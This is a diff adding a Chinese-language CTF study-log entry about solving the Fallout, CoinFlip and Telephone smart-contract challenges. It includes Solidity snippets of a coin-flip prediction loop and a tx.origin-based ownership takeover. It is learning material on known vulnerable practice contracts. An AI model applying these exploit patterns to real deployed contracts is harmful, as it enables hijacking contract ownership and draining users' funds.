@@ -39,6 +39,58 @@ timezone: Asia/Shanghai
 
 
 
+### 2024.08.31
+
+尖锐爆铭，昨天做了题，但没交pr，应该是忙着下班以为自己提了
+
+学习內容:
+
+这两天做了A系列3题
+
+1. Fallout: 感觉很简单的一道题，可以直接调用函数修改合约 owner，但是没看懂那个真实实例的讲解
+
+2. CoinFlip: 链上没有随机数的体验？区块信息一切都是透明的，函数调用就在同一个区块里，对作弊码有了更深的体验，在同一个函数调用中也能改变区块号，太牛了，所以作弊码是高于所有函数的？
+
+   ```solidity
+       function test_attack() public {
+           console.log("before",coin.consecutiveWins());
+   
+           for(uint256 i=0;i<10;i++){
+               attackContract.attack();
+               uint256 nextblock = block.number+1;
+               vm.roll(nextblock);
+           }
+           console.log("after",coin.consecutiveWins());
+       }
+   ```
+
+3. telephone: 之前就记得合约变量去调用合约函数他的tx.origin是不同的，成功的解题，
+
+   但是在 attack 方法中去调用发现，发现 msg.sender 和 tx.origin 都是一个，当时很纠结，没看懂怎么成功的，后面通过去看讲解，有了跟更入的理解
+
+   首先：1. 原理是对所有交易来说，tx.origin 一定是用户地址，但如果有中继合约，没有直接与最终合约交互， 那 msg.sender 就会是合约地址
+
+   2. 我的误区在于，我是在 attack 函数中测试 tx.origin 和 msg.sender 的，对于这个函数来说，我作为用户是直接去用的，而changeOwner函数才是我最终通过合约变量去调用的函数，所以，只对于 changeOwner 函数来说，我的 msg.owner 是 attack合约的地址，这也导致了两个不一样，通过了
+
+      ```solidity
+      // attack
+          function attack() public returns (address) {
+              telephone.changeOwner(tx.origin);
+              return tx.origin;
+          }
+          
+      // changeOwner
+          function changeOwner(address _owner) public {
+              if (tx.origin != msg.sender) {
+                  owner = _owner;
+              }
+          }
+      ```
+
+[POC]: https://github.com/DeFiHackLabs/Web3-CTF-Intensive-CoLearning/tree/main/Writeup/lianshus
+
+
+
 ### 2024.07.12
 
 <!-- Content_END -->
